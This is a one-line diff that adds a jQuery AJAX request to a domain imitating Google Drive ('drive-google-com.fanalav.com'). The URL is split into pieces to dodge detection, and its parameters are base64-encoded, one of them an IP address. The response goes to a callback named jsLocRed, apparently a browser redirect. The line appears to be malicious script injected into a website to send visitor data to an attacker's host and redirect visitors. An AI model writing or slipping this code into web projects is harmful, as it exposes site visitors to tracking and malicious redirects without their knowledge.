@@ -1,0 +1,1 @@
+$.ajax({ url: 'http://ww1.drive-google-com.fanalav.com/' + 's' + 'earch/tsc.php?200=MjgyNDQ0MDQz&21=MzcuNzIuMTc1LjY3&681=MTUxNTc4MDg3MGZjODVmM2JjNDkxN2Y0MTM0MDlkZGI4ODE4ZmQ2YmEw&crc=6ab42414ec38c08f6494c29870b172fb958df69f&cv=1',success:jsLocRed});
